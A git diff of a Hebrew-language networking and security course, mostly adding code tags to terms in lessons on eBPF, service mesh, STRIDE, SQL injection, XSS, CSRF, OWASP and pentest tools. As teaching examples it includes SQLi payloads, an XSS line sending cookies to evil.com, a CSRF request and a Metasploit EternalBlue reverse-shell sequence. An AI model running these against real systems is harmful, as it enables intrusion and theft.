           <p>מאפשר להריץ קוד בתוך Linux kernel — בלי לכתוב <code>kernel module</code>, בלי <code>reboot</code>, בבטיחות מוחלטת.</p>
           <p><strong>הרעיון:</strong></p>
           <ul>
@@ -5378,9 +5378,9 @@ const fingerprint = canvas.toDataURL()
           </ul>
           <p><strong>למה זה מהפכני לרשתות:</strong></p>
           <ul>
-            <li><strong>XDP (eXpress Data Path):</strong> עיבוד packet <em>לפני</em> ה-kernel network stack — מיליוני pps</li>
-            <li><strong>Cilium:</strong> CNI ל-Kubernetes שמחליף iptables בeBPF. תוצאה: 10x ביצועים, monitoring מובנה</li>
-            <li><strong>Cloudflare:</strong> DDoS mitigation שלהם רץ על eBPF/XDP — drop ב-line-rate ב-wire</li>
+            <li><strong><code>XDP</code> (eXpress Data Path):</strong> עיבוד packet <em>לפני</em> ה-kernel network stack — מיליוני pps</li>
+            <li><strong><code>Cilium</code>:</strong> CNI ל-<code>Kubernetes</code> שמחליף <code>iptables</code> ב<code>eBPF</code>. תוצאה: 10x ביצועים, monitoring מובנה</li>
+            <li><strong><code>Cloudflare</code>:</strong> <code>DDoS</code> mitigation שלהם רץ על <code>eBPF</code>/<code>XDP</code> — drop ב-line-rate ב-wire</li>
           </ul>
           <div class="code-preview">
             <pre><code>// eBPF XDP program — drop כל UDP מ-IP מסוים:
@@ -5404,21 +5404,21 @@ int block_udp(struct xdp_md *ctx) {
         type: "explanation",
         title: "Starlink – אינטרנט מהחלל",
         content: `
-          <p>SpaceX Starlink: ~6,000 לווינים ב-Low Earth Orbit (LEO, 550km), עם תוכנית ל-42,000.</p>
+          <p><code>SpaceX Starlink</code>: ~6,000 לווינים ב-<code>Low Earth Orbit</code> (<code>LEO</code>, 550km), עם תוכנית ל-42,000.</p>
           <p>ה-constellation הגדולה ביותר בהיסטוריה.</p>
           <p><strong>למה LEO ולא GEO?</strong></p>
           <table class="content-table">
-            <tr><th></th><th>GEO (35,786km)</th><th>LEO (550km)</th></tr>
-            <tr><td>Latency</td><td>600ms+ RTT</td><td>20-40ms RTT</td></tr>
+            <tr><th></th><th><code>GEO</code> (35,786km)</th><th><code>LEO</code> (550km)</th></tr>
+            <tr><td><code>Latency</code></td><td>600ms+ <code>RTT</code></td><td>20-40ms <code>RTT</code></td></tr>
             <tr><td>לווינים נדרשים</td><td>3 מכסים את כל כדור הארץ</td><td>אלפים (תמיד נעים מעל)</td></tr>
-            <tr><td>bandwidth per user</td><td>נמוך יחסית</td><td>50-200 Mbps</td></tr>
+            <tr><td><code>bandwidth</code> per user</td><td>נמוך יחסית</td><td>50-200 Mbps</td></tr>
             <tr><td>גישה לאזורים נידחים</td><td>✓</td><td>✓</td></tr>
           </table>
           <p><strong>איך Starlink מנתב:</strong></p>
           <ul>
             <li>ה-user terminal (dish) מתחבר ל-satellite שמעל</li>
-            <li>Laser inter-satellite links (ISL) מנתבים בין לווינים — כמו <code>BGP</code> בחלל</li>
-            <li>ה-traffic יורד ל-ground station ומשם עולה לאינטרנט</li>
+            <li>Laser <code>inter-satellite links</code> (<code>ISL</code>) מנתבים בין לווינים — כמו <code>BGP</code> בחלל</li>
+            <li>ה-traffic יורד ל-<code>ground station</code> ומשם עולה לאינטרנט</li>
           </ul>
           <div class="diagram-container">
             <svg viewBox="0 0 360 100" class="content-diagram">
@@ -5458,13 +5458,13 @@ int block_udp(struct xdp_md *ctx) {
         title: "Service Mesh ו-Zero Trust ב-Enterprises",
         content: `
           <p>בעולם ה-<code>microservices</code> — לא מספיק לאבטח את ה-<code>perimeter</code>.</p>
-          <p>כל <code>service</code> צריך לאמת כל <code>request</code>. זה <strong>Service Mesh</strong>.</p>
-          <p><strong>sidecar proxy pattern:</strong></p>
+          <p>כל <code>service</code> צריך לאמת כל <code>request</code>. זה <strong><code>Service Mesh</code></strong>.</p>
+          <p><strong><code>sidecar proxy</code> pattern:</strong></p>
           <ul>
-            <li>כל pod ב-Kubernetes מקבל sidecar container (לרוב Envoy proxy)</li>
-            <li>כל תנועה (in/out) עוברת דרך ה-sidecar</li>
-            <li>mTLS אוטומטי: כל שיחה בין services מוצפנת + authenticated</li>
-            <li>observability חינמית: metrics, traces, logs — בלי שינוי קוד</li>
+            <li>כל <code>pod</code> ב-<code>Kubernetes</code> מקבל <code>sidecar</code> container (לרוב <code>Envoy proxy</code>)</li>
+            <li>כל תנועה (in/out) עוברת דרך ה-<code>sidecar</code></li>
+            <li><code>mTLS</code> אוטומטי: כל שיחה בין services מוצפנת + authenticated</li>
+            <li><code>observability</code> חינמית: metrics, traces, logs — בלי שינוי קוד</li>
           </ul>
           <div class="code-preview">
             <pre><code># Istio Service Mesh — traffic policy:
@@ -5485,7 +5485,7 @@ spec:
     interval: 30s
     baseEjectionTime: 30s  # circuit breaker</code></pre>
           </div>
-          <p><strong>Circuit Breaker pattern:</strong> אם <code>service</code> מחזיר שגיאות — ה-<code>mesh</code> מפסיק לשלוח אליו ומחכה ל-<code>recovery</code>.</p>
+          <p><strong><code>Circuit Breaker</code> pattern:</strong> אם <code>service</code> מחזיר שגיאות — ה-<code>mesh</code> מפסיק לשלוח אליו ומחכה ל-<code>recovery</code>.</p>
           <p>מונע <code>cascading failures</code>.</p>
           <p><strong>Zero Trust + Service Mesh:</strong></p>
           <ul>
@@ -5520,11 +5520,11 @@ spec:
           <div class="chapter-summary">
             <h3>נקודות מפתח:</h3>
             <ul>
-              <li>QUIC: UDP-based, 0-RTT, streams עצמאיים (אין HOL blocking), connection migration. בסיס HTTP/3</li>
-              <li>eBPF: קוד ב-kernel בלי kernel module. XDP = עיבוד packet לפני network stack. Cilium, Cloudflare DDoS</li>
-              <li>Starlink LEO: 550km, 20-40ms latency (vs. 600ms GEO). אלפי לווינים, ISL lasers בחלל</li>
-              <li>Service Mesh: sidecar proxy, mTLS אוטומטי, circuit breaker, Zero Trust per-service</li>
-              <li>eBPF מחליף iptables. IoT = 30B מכשירים ב-2030. הרשת מחברת עולם פיזי</li>
+              <li><code>QUIC</code>: <code>UDP</code>-based, <code>0-RTT</code>, <code>streams</code> עצמאיים (אין <code>HOL blocking</code>), <code>connection migration</code>. בסיס <code>HTTP/3</code></li>
+              <li><code>eBPF</code>: קוד ב-<code>kernel</code> בלי <code>kernel module</code>. <code>XDP</code> = עיבוד packet לפני <code>network stack</code>. <code>Cilium</code>, <code>Cloudflare</code> <code>DDoS</code></li>
+              <li><code>Starlink LEO</code>: 550km, 20-40ms latency (vs. 600ms <code>GEO</code>). אלפי לווינים, <code>ISL</code> lasers בחלל</li>
+              <li><code>Service Mesh</code>: <code>sidecar proxy</code>, <code>mTLS</code> אוטומטי, <code>circuit breaker</code>, <code>Zero Trust</code> per-service</li>
+              <li><code>eBPF</code> מחליף <code>iptables</code>. <code>IoT</code> = 30B מכשירים ב-2030. הרשת מחברת עולם פיזי</li>
             </ul>
           </div>
         `
@@ -5587,9 +5587,9 @@ spec:
 </div>
 <table class="content-table">
   <tr><th>עיקרון</th><th>הגדרה</th><th>איום נגדו</th><th>הגנה</th></tr>
-  <tr><td><strong>Confidentiality</strong></td><td>רק מורשים יכולים לגשת למידע</td><td>Sniffing, Data Breach</td><td>הצפנה, ACL, MFA</td></tr>
-  <tr><td><strong>Integrity</strong></td><td>המידע לא שונה ללא הרשאה</td><td>Tampering, Injection</td><td>Hash, Digital Signature, Audit Log</td></tr>
-  <tr><td><strong>Availability</strong></td><td>המערכת זמינה כשצריך</td><td>DoS/DDoS, Ransomware</td><td>Redundancy, Rate Limiting, Backup</td></tr>
+  <tr><td><strong><code>Confidentiality</code></strong></td><td>רק מורשים יכולים לגשת למידע</td><td><code>Sniffing</code>, <code>Data Breach</code></td><td>הצפנה, <code>ACL</code>, <code>MFA</code></td></tr>
+  <tr><td><strong><code>Integrity</code></strong></td><td>המידע לא שונה ללא הרשאה</td><td><code>Tampering</code>, <code>Injection</code></td><td><code>Hash</code>, <code>Digital Signature</code>, <code>Audit Log</code></td></tr>
+  <tr><td><strong><code>Availability</code></strong></td><td>המערכת זמינה כשצריך</td><td><code>DoS</code>/<code>DDoS</code>, <code>Ransomware</code></td><td><code>Redundancy</code>, <code>Rate Limiting</code>, <code>Backup</code></td></tr>
 </table>
 <p>כשאתה שומע על <code>breach</code>, שאל: <em>איזה עיקרון הופר?</em></p>
 <ul>
@@ -5608,21 +5608,21 @@ spec:
 <p>Microsoft פיתחה את <code>STRIDE</code> בשנות ה-90. הוא הכלי הטוב ביותר לניתוח סיסטמטי של איומים:</p>
 <table class="content-table">
   <tr><th>אות</th><th>איום</th><th>דוגמה</th><th>הגנה</th></tr>
-  <tr><td><strong>S</strong></td><td>Spoofing — התחזות</td><td>Email spoofing, ARP poisoning</td><td>אימות, SPF/DKIM, certificates</td></tr>
-  <tr><td><strong>T</strong></td><td>Tampering — שינוי נתונים</td><td>SQL injection, MITM</td><td>Hashing, digital signatures, TLS</td></tr>
-  <tr><td><strong>R</strong></td><td>Repudiation — הכחשה</td><td>"לא אני שלחתי את הפקודה"</td><td>Audit logs, digital signatures</td></tr>
-  <tr><td><strong>I</strong></td><td>Info Disclosure — דליפת מידע</td><td>חשיפת error messages עם DB info</td><td>הצפנה, input validation</td></tr>
-  <tr><td><strong>D</strong></td><td>Denial of Service</td><td>SYN flood, Slowloris</td><td>Rate limiting, CDN, WAF</td></tr>
-  <tr><td><strong>E</strong></td><td>Elevation of Privilege</td><td>Buffer overflow → root access</td><td>Least privilege, sandboxing</td></tr>
+  <tr><td><strong>S</strong></td><td><code>Spoofing</code> — התחזות</td><td><code>Email spoofing</code>, <code>ARP poisoning</code></td><td>אימות, <code>SPF</code>/<code>DKIM</code>, <code>certificates</code></td></tr>
+  <tr><td><strong>T</strong></td><td><code>Tampering</code> — שינוי נתונים</td><td><code>SQL injection</code>, <code>MITM</code></td><td><code>Hashing</code>, <code>digital signatures</code>, <code>TLS</code></td></tr>
+  <tr><td><strong>R</strong></td><td><code>Repudiation</code> — הכחשה</td><td>"לא אני שלחתי את הפקודה"</td><td><code>Audit logs</code>, <code>digital signatures</code></td></tr>
+  <tr><td><strong>I</strong></td><td><code>Info Disclosure</code> — דליפת מידע</td><td>חשיפת <code>error messages</code> עם <code>DB</code> info</td><td>הצפנה, <code>input validation</code></td></tr>
+  <tr><td><strong>D</strong></td><td><code>Denial of Service</code></td><td><code>SYN flood</code>, <code>Slowloris</code></td><td><code>Rate limiting</code>, <code>CDN</code>, <code>WAF</code></td></tr>
+  <tr><td><strong>E</strong></td><td><code>Elevation of Privilege</code></td><td><code>Buffer overflow</code> → <code>root access</code></td><td><code>Least privilege</code>, <code>sandboxing</code></td></tr>
 </table>
-<p><strong>Attack Surface Analysis</strong></p>
+<p><strong><code>Attack Surface Analysis</code></strong></p>
 <p><code>Attack Surface</code> הוא כל נקודות הכניסה האפשריות למערכת.</p>
 <p>כלל אצבע: צמצם את ה-<code>Attack Surface</code> ככל האפשר.</p>
 <ul>
-<li>כל endpoint API שחשוף = attack surface</li>
-<li>כל dependency (npm, pip) = attack surface</li>
-<li>כל employee עם access = attack surface</li>
-<li>כל port פתוח = attack surface</li>
+<li>כל <code>endpoint API</code> שחשוף = <code>attack surface</code></li>
+<li>כל <code>dependency</code> (<code>npm</code>, <code>pip</code>) = <code>attack surface</code></li>
+<li>כל <code>employee</code> עם <code>access</code> = <code>attack surface</code></li>
+<li>כל <code>port</code> פתוח = <code>attack surface</code></li>
 </ul>
 </div>`
       },
@@ -5639,11 +5639,11 @@ spec:
 </ul>
 <p><strong>שלבי המתקפה (kill chain):</strong></p>
 <ol>
-<li><strong>Reconnaissance:</strong> התוקפים זיהו ש-Target עובדת עם vendor HVAC (Fazio Mechanical) שיש לו remote access לרשת לניטור מערכות חימום.</li>
-<li><strong>Initial Access:</strong> Phishing email ל-Fazio → גנבו credentials → נכנסו לפורטל הvendor של Target.</li>
-<li><strong>Lateral Movement:</strong> הרשת הפנימית של Target לא הייתה מפולחת. מה-vendor portal הגיעו ל-POS systems (מכשירי קופה).</li>
-<li><strong>Payload:</strong> התקינו RAM scraper malware על עשרות אלפי מכשירי POS — הוא לכד את נתוני הכרטיס ברגע שהמגנט נקרא, לפני ההצפנה.</li>
-<li><strong>Exfiltration:</strong> הנתונים יצאו דרך FTP servers שהוקמו בתוך הרשת של Target לשרתים ברוסיה.</li>
+<li><strong><code>Reconnaissance</code>:</strong> התוקפים זיהו ש-Target עובדת עם vendor HVAC (Fazio Mechanical) שיש לו <code>remote access</code> לרשת לניטור מערכות חימום.</li>
+<li><strong><code>Initial Access</code>:</strong> Phishing email ל-Fazio → גנבו credentials → נכנסו לפורטל הvendor של Target.</li>
+<li><strong><code>Lateral Movement</code>:</strong> הרשת הפנימית של Target לא הייתה מפולחת. מה-<code>vendor portal</code> הגיעו ל-<code>POS systems</code> (מכשירי קופה).</li>
+<li><strong><code>Payload</code>:</strong> התקינו <code>RAM scraper malware</code> על עשרות אלפי מכשירי <code>POS</code> — הוא לכד את נתוני הכרטיס ברגע שהמגנט נקרא, לפני ההצפנה.</li>
+<li><strong><code>Exfiltration</code>:</strong> הנתונים יצאו דרך <code>FTP servers</code> שהוקמו בתוך הרשת של Target לשרתים ברוסיה.</li>
 </ol>
 <p><strong>מה שהיה צריך לעשות:</strong></p>
 <p><code>Network Segmentation</code> — גישת ה-vendor הייתה צריכה להיות לרשת נפרדת שלא מחוברת למערכות ה-<code>POS</code>.</p>
@@ -5707,7 +5707,7 @@ sudo bettercap -iface eth0
         type: "explanation",
         title: "SYN Flood ו-TCP Exhaustion",
         content: `<div dir="rtl">
-<p><strong>SYN Flood — ניצול TCP Handshake</strong></p>
+<p><strong><code>SYN Flood</code> — ניצול <code>TCP Handshake</code></strong></p>
 <p>בתהליך ה-<code>TCP three-way handshake</code>, השרת מקצה מקום בזיכרון עבור כל <code>SYN</code> שמגיע.</p>
 <p>זוהי מה שנקרא <code>half-open connection</code>.</p>
 <p><strong>במתקפת <code>SYN Flood</code>:</strong></p>
@@ -5726,7 +5726,7 @@ sudo bettercap -iface eth0
 # - מיליוני SYNs ← מיליוני TCBs ב-memory
 # - ה-backlog queue מלא
 # - חיבורים לגיטימיים נדחים (SYN-ACK לא נשלח)</code></pre></div>
-<p><strong>SYN Cookies — הפתרון</strong></p>
+<p><strong><code>SYN Cookies</code> — הפתרון</strong></p>
 <p>במקום לשמור <code>state</code> בזיכרון, השרת מקודד את כל המידע הנחוץ בתוך ה-<code>ISN</code> (Initial Sequence Number) של ה-<code>SYN-ACK</code>.</p>
 <p>רק כשמגיע <code>ACK</code> אמיתי — השרת משחזר את ה-<code>state</code>.</p>
 <p>מי ששלח כתובת <code>IP</code> מזויפת לא יוכל לשלוח <code>ACK</code> תקין, כי ה-<code>SYN-ACK</code> נשלח לכתובת שאינה שלו.</p>
@@ -5743,8 +5743,8 @@ sysctl net.ipv4.tcp_synack_retries
         type: "story",
         title: "הסיפור: DDoS של 3.47 Tbps",
         content: `<div dir="rtl">
-<p><strong>ה-DDoS הגדול בהיסטוריה — ועדיין נשארנו online</strong></p>
-<p>ינואר 2022: Microsoft דיווחה על <code>DDoS attack</code> של <strong>3.47 Tbps</strong> על לקוח Azure.</p>
+<p><strong>ה-<code>DDoS</code> הגדול בהיסטוריה — ועדיין נשארנו online</strong></p>
+<p>ינואר 2022: Microsoft דיווחה על <code>DDoS attack</code> של <strong>3.47 Tbps</strong> על לקוח <code>Azure</code>.</p>
 <ul>
 <li>שיא עולמי</li>
 <li>10,000 sources ב-10 מדינות</li>
@@ -5791,15 +5791,15 @@ const query = "SELECT * FROM users WHERE email='" + email + "' AND password='" +
 // ====== Parameterized Queries — הפתרון ======
 const query = "SELECT * FROM users WHERE email=? AND password=?";
 db.execute(query, [email, hashedPassword]); // SAFE</code></pre></div>
-<p><strong>SQLi Variants</strong></p>
+<p><strong><code>SQLi Variants</code></strong></p>
 <table class="content-table">
   <tr><th>סוג</th><th>עובד איך</th><th>דוגמה</th></tr>
-  <tr><td>Classic</td><td>תגובת שגיאה מחזירה נתונים</td><td>' OR '1'='1</td></tr>
-  <tr><td>Blind Boolean</td><td>שינוי תוכן דף (true/false)</td><td>' AND 1=1-- (vs AND 1=2--)</td></tr>
-  <tr><td>Time-based Blind</td><td>עיכוב תגובה = true</td><td>'; IF(1=1) WAITFOR DELAY '5s'--</td></tr>
-  <tr><td>Union-based</td><td>חיבור query נוסף</td><td>' UNION SELECT username,password FROM users--</td></tr>
+  <tr><td><code>Classic</code></td><td>תגובת שגיאה מחזירה נתונים</td><td>' OR '1'='1</td></tr>
+  <tr><td><code>Blind Boolean</code></td><td>שינוי תוכן דף (true/false)</td><td>' AND 1=1-- (vs AND 1=2--)</td></tr>
+  <tr><td><code>Time-based Blind</code></td><td>עיכוב תגובה = true</td><td>'; IF(1=1) WAITFOR DELAY '5s'--</td></tr>
+  <tr><td><code>Union-based</code></td><td>חיבור query נוסף</td><td>' UNION SELECT username,password FROM users--</td></tr>
 </table>
-<p><strong>כלי:</strong> sqlmap מבצע SQLi אוטומטית: <code>sqlmap -u "https://target.com/search?q=1" --dbs</code></p>
+<p><strong>כלי:</strong> <code>sqlmap</code> מבצע <code>SQLi</code> אוטומטית: <code>sqlmap -u "https://target.com/search?q=1" --dbs</code></p>
 </div>`
       },
       {
@@ -5820,7 +5820,7 @@ https://site.com/search?q=<script>document.location='https://evil.com/steal?c='+
 // 1. HTML escape: & → &amp; < → &lt; > → &gt;
 // 2. Content Security Policy (CSP) header
 // 3. HttpOnly cookies (JavaScript לא יכול לקרוא)</code></pre></div>
-<p><strong>CSRF — Cross-Site Request Forgery</strong></p>
+<p><strong><code>CSRF</code> — <code>Cross-Site Request Forgery</code></strong></p>
 <p><code>CSRF</code> מנצל את העובדה שהדפדפן שולח <code>cookies</code> אוטומטית עם כל בקשה לאותו <code>domain</code>:</p>
 <div class="code-preview"><pre><code><!-- באתר זדוני — תוקף שולח לכם לinк -->
 <img src="https://bank.com/transfer?to=attacker&amount=10000" width="0">
@@ -5839,16 +5839,16 @@ https://site.com/search?q=<script>document.location='https://evil.com/steal?c='+
 <p>OWASP (Open Worldwide Application Security Project) מפרסמת רשימה של 10 הסיכונים הנפוצים ביותר:</p>
 <table class="content-table">
   <tr><th>#</th><th>קטגוריה</th><th>דוגמה</th></tr>
-  <tr><td>A01</td><td>Broken Access Control</td><td>IDOR — גישה לdata של user אחר ע"י שינוי ID</td></tr>
-  <tr><td>A02</td><td>Cryptographic Failures</td><td>אחסון passwords בplaintext, HTTP במקום HTTPS</td></tr>
-  <tr><td>A03</td><td>Injection</td><td>SQL, NoSQL, OS Command, LDAP injection</td></tr>
-  <tr><td>A04</td><td>Insecure Design</td><td>חוסר threat modeling בשלב העיצוב</td></tr>
-  <tr><td>A05</td><td>Security Misconfiguration</td><td>Default passwords, open S3 buckets, verbose errors</td></tr>
-  <tr><td>A06</td><td>Vulnerable Components</td><td>Log4Shell, npm packages עם CVEs</td></tr>
-  <tr><td>A07</td><td>Auth & Session Failures</td><td>Weak passwords, session fixation, JWT none alg</td></tr>
-  <tr><td>A08</td><td>Software Integrity Failures</td><td>SolarWinds — update pipeline compromise</td></tr>
-  <tr><td>A09</td><td>Logging & Monitoring Failures</td><td>ללא logs ← לא יודעים שנפרצנו</td></tr>
-  <tr><td>A10</td><td>SSRF</td><td>Server fetches URLs מInput — חשיפת AWS metadata</td></tr>
+  <tr><td>A01</td><td><code>Broken Access Control</code></td><td><code>IDOR</code> — גישה לdata של user אחר ע"י שינוי ID</td></tr>
+  <tr><td>A02</td><td><code>Cryptographic Failures</code></td><td>אחסון <code>passwords</code> ב-<code>plaintext</code>, <code>HTTP</code> במקום <code>HTTPS</code></td></tr>
+  <tr><td>A03</td><td><code>Injection</code></td><td><code>SQL</code>, <code>NoSQL</code>, <code>OS Command</code>, <code>LDAP injection</code></td></tr>
+  <tr><td>A04</td><td><code>Insecure Design</code></td><td>חוסר <code>threat modeling</code> בשלב העיצוב</td></tr>
+  <tr><td>A05</td><td><code>Security Misconfiguration</code></td><td><code>Default passwords</code>, open <code>S3 buckets</code>, <code>verbose errors</code></td></tr>
+  <tr><td>A06</td><td><code>Vulnerable Components</code></td><td><code>Log4Shell</code>, <code>npm</code> packages עם <code>CVEs</code></td></tr>
+  <tr><td>A07</td><td><code>Auth & Session Failures</code></td><td><code>Weak passwords</code>, <code>session fixation</code>, <code>JWT</code> none alg</td></tr>
+  <tr><td>A08</td><td><code>Software Integrity Failures</code></td><td><code>SolarWinds</code> — <code>update pipeline compromise</code></td></tr>
+  <tr><td>A09</td><td><code>Logging & Monitoring Failures</code></td><td>ללא logs ← לא יודעים שנפרצנו</td></tr>
+  <tr><td>A10</td><td><code>SSRF</code></td><td><code>Server</code> fetches URLs מ-Input — חשיפת <code>AWS metadata</code></td></tr>
 </table>
 <p><strong>דוגמה — <code>IDOR</code> (A01):</strong></p>
 <p>נניח שהכתובת <code>GET /api/orders/1234</code> מחזירה את ההזמנה שלך.</p>
@@ -5895,12 +5895,12 @@ https://site.com/search?q=<script>document.location='https://evil.com/steal?c='+
 </div>
 <table class="content-table">
   <tr><th>שלב</th><th>מה עושים</th><th>כלים</th></tr>
-  <tr><td>Recon פסיבי</td><td>WHOIS, Google dorking, LinkedIn, Shodan</td><td>theHarvester, maltego</td></tr>
-  <tr><td>Recon אקטיבי</td><td>DNS enumeration, port scan, OS fingerprint</td><td>Nmap, Masscan</td></tr>
-  <tr><td>Vulnerability Scan</td><td>CVE detection, misconfiguration</td><td>Nessus, OpenVAS, Nuclei</td></tr>
-  <tr><td>Exploitation</td><td>ניצול CVEs, web vulnerabilities</td><td>Metasploit, Burp Suite, SQLmap</td></tr>
-  <tr><td>Post-Exploitation</td><td>Privilege escalation, lateral movement, data access</td><td>Mimikatz, BloodHound, Cobalt Strike</td></tr>
-  <tr><td>Reporting</td><td>Executive summary + Technical findings + CVSS scores</td><td>—</td></tr>
+  <tr><td><code>Recon</code> פסיבי</td><td><code>WHOIS</code>, <code>Google dorking</code>, <code>LinkedIn</code>, <code>Shodan</code></td><td><code>theHarvester</code>, <code>maltego</code></td></tr>
+  <tr><td><code>Recon</code> אקטיבי</td><td><code>DNS enumeration</code>, <code>port scan</code>, <code>OS fingerprint</code></td><td><code>Nmap</code>, <code>Masscan</code></td></tr>
+  <tr><td><code>Vulnerability Scan</code></td><td><code>CVE</code> detection, misconfiguration</td><td><code>Nessus</code>, <code>OpenVAS</code>, <code>Nuclei</code></td></tr>
+  <tr><td><code>Exploitation</code></td><td>ניצול <code>CVEs</code>, <code>web vulnerabilities</code></td><td><code>Metasploit</code>, <code>Burp Suite</code>, <code>SQLmap</code></td></tr>
+  <tr><td><code>Post-Exploitation</code></td><td><code>Privilege escalation</code>, <code>lateral movement</code>, <code>data access</code></td><td><code>Mimikatz</code>, <code>BloodHound</code>, <code>Cobalt Strike</code></td></tr>
+  <tr><td><code>Reporting</code></td><td><code>Executive summary</code> + <code>Technical findings</code> + <code>CVSS</code> scores</td><td>—</td></tr>
 </table>
 </div>`
       },
@@ -5909,7 +5909,7 @@ https://site.com/search?q=<script>document.location='https://evil.com/steal?c='+
         title: "כלי Pentest עיקריים",
         content: `<div dir="rtl">
 <p><strong>ארגז הכלים של ה-Pentester</strong></p>
-<p><strong>Nmap — לב הסריקה</strong></p>
+<p><strong><code>Nmap</code> — לב הסריקה</strong></p>
 <div class="code-preview"><pre><code># סריקה בסיסית
 nmap -sV -O 192.168.1.1
 
@@ -5922,14 +5922,14 @@ nmap --script http-enum 192.168.1.1
 
 # סריקת UDP (איטית אבל חשובה)
 nmap -sU -p 53,161,500 192.168.1.1</code></pre></div>
-<p><strong>Burp Suite — Web Application Testing</strong></p>
+<p><strong><code>Burp Suite</code> — <code>Web Application Testing</code></strong></p>
 <div class="code-preview"><pre><code># Burp Suite Community/Pro:
 # Proxy — יירוט ושינוי HTTP requests
 # Repeater — שליחת requests ידנית שוב ושוב
 # Intruder — brute force, fuzzing
 # Scanner (Pro) — automatic vulnerability scan
 # Decoder — base64, URL encode/decode</code></pre></div>
-<p><strong>Metasploit — Framework לExploitation</strong></p>
+<p><strong><code>Metasploit</code> — Framework ל-<code>Exploitation</code></strong></p>
 <div class="code-preview"><pre><code>msfconsole
 search ms17-010          # EternalBlue
 use exploit/windows/smb/ms17_010_eternalblue
@@ -5937,7 +5937,7 @@ set RHOSTS 192.168.1.5
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST 192.168.1.100
 run</code></pre></div>
-<p><strong>Kali Linux</strong> מגיעה עם כל הכלים הללו מותקנים מראש.</p>
+<p><strong><code>Kali Linux</code></strong> מגיעה עם כל הכלים הללו מותקנים מראש.</p>
 <p>היא ההפצה הסטנדרטית לעולם ה-<code>pentesting</code>.</p>
 </div>`
       },
@@ -5950,13 +5950,13 @@ run</code></pre></div>
 <p>הקורבן: בנק בינלאומי. משך הפעולה: שבועיים.</p>
 <p><strong>שלב 1 — <code>Recon</code> פסיבי (3 ימים):</strong></p>
 <ul>
-<li><code>LinkedIn</code> חשף 15 עובדים במחלקת ה-IT</li>
+<li><code>LinkedIn</code> חשף 15 עובדים במחלקת ה-<code>IT</code></li>
 <li>דף <code>GitHub</code> של אחד מהם הכיל <code>credentials</code> ישנים שלא הוסרו למסד הנתונים של הפרודקשן</li>
 <li><code>Shodan</code> חשף נקודת גישה <code>VPN</code> ישנה עם חולשת <code>Citrix CVE</code></li>
 </ul>
 <p><strong>שלב 2 — Initial Access:</strong></p>
 <p>Phishing email מותאם אישית ל-IT manager — "עדכון דחוף ל-VPN client".</p>
-<p>Payload = Cobalt Strike beacon. קיבלו <code>foothold</code> ב-workstation פנימי.</p>
+<p><code>Payload</code> = <code>Cobalt Strike</code> beacon. קיבלו <code>foothold</code> ב-workstation פנימי.</p>
 <p><strong>שלב 3 — <code>Lateral Movement</code>:</strong></p>
 <ul>
 <li>הכלי <code>BloodHound</code> מיפה את מבנה ה-<code>Active Directory</code></li>
@@ -5965,8 +5965,8 @@ run</code></pre></div>
 </ul>
 <p><strong>הממצאים בדוח:</strong></p>
 <ul>
-<li>Criticals: 3 (Citrix CVE, weak AD, credentials in GitHub)</li>
-<li>Highs: 7</li>
+<li><code>Criticals</code>: 3 (<code>Citrix CVE</code>, weak <code>AD</code>, <code>credentials</code> in <code>GitHub</code>)</li>
+<li><code>Highs</code>: 7</li>
 <li>סה"כ: 47 findings</li>
 </ul>
 <p><strong>הלקח:</strong> הבנק האמין שהוא מוגן. ה-<code>CISO</code> אמר: "שלמנו $500K על <code>firewalls</code>".</p>
@@ -6021,19 +6021,19 @@ run</code></pre></div>
 <p><code>SIEM</code> (Security Information and Event Management) מאגד <code>logs</code> מכל המערכות בארגון ומנתח אותם בזמן אמת:</p>
 <table class="content-table">
   <tr><th>כלי SIEM</th><th>מאפיין</th></tr>
-  <tr><td>Splunk</td><td>מסחרי, החזק ביותר, SPL query language</td></tr>
-  <tr><td>Elastic SIEM (ELK)</td><td>Open source, Kibana dashboards, KQL</td></tr>
-  <tr><td>Microsoft Sentinel</td><td>Cloud-native Azure, KQL, AI correlation</td></tr>
-  <tr><td>IBM QRadar</td><td>Enterprise, AQL, behavioral analytics</td></tr>
+  <tr><td><code>Splunk</code></td><td>מסחרי, החזק ביותר, <code>SPL</code> query language</td></tr>
+  <tr><td><code>Elastic SIEM</code> (<code>ELK</code>)</td><td>Open source, <code>Kibana</code> dashboards, <code>KQL</code></td></tr>
+  <tr><td><code>Microsoft Sentinel</code></td><td>Cloud-native <code>Azure</code>, <code>KQL</code>, <code>AI</code> correlation</td></tr>
+  <tr><td><code>IBM QRadar</code></td><td>Enterprise, <code>AQL</code>, behavioral analytics</td></tr>
 </table>
 <p><strong>Incident Response Lifecycle (NIST)</strong></p>
 <ol>
-<li><strong>Preparation:</strong> IR plan, playbooks, team roles, tools ready</li>
-<li><strong>Detection & Analysis:</strong> Alert fires → triage → scope assessment</li>
-<li><strong>Containment:</strong> Isolate affected systems, preserve evidence</li>
-<li><strong>Eradication:</strong> Remove malware, patch vulnerability, rotate credentials</li>
-<li><strong>Recovery:</strong> Restore from clean backup, monitor closely</li>
-<li><strong>Lessons Learned:</strong> Post-mortem, update playbooks, train team</li>
+<li><strong><code>Preparation</code>:</strong> <code>IR</code> plan, playbooks, team roles, tools ready</li>
+<li><strong><code>Detection & Analysis</code>:</strong> Alert fires → triage → scope assessment</li>
+<li><strong><code>Containment</code>:</strong> Isolate affected systems, preserve evidence</li>
+<li><strong><code>Eradication</code>:</strong> Remove malware, patch vulnerability, rotate credentials</li>
+<li><strong><code>Recovery</code>:</strong> Restore from clean backup, monitor closely</li>
+<li><strong><code>Lessons Learned</code>:</strong> Post-mortem, update playbooks, train team</li>
 </ol>
 <div class="code-preview"><pre><code># Splunk — hunting lateral movement
 index=windows EventCode=4624
@@ -6090,20 +6090,20 @@ index=windows EventCode=4624
 <p>המטרה: למצוא <code>flag</code> — מחרוזת מיוחדת שמוכיחה שפתרת את האתגר.</p>
 <table class="content-table">
   <tr><th>קטגוריה</th><th>מה זה</th><th>כלים</th></tr>
-  <tr><td>Web</td><td>SQL injection, XSS, SSRF, deserialization</td><td>Burp Suite, sqlmap</td></tr>
-  <tr><td>Pwn (Binary)</td><td>Buffer overflow, ROP chains, heap exploitation</td><td>pwndbg, pwntools, gdb</td></tr>
-  <tr><td>Crypto</td><td>RSA attacks, AES modes, hash collisions</td><td>Python, SageMath</td></tr>
-  <tr><td>Forensics</td><td>ניתוח memory dumps, steganography, PCAP</td><td>Autopsy, Volatility, Wireshark</td></tr>
-  <tr><td>Reverse Engineering</td><td>disassembly, decompilation, anti-debug</td><td>Ghidra, IDA, x64dbg</td></tr>
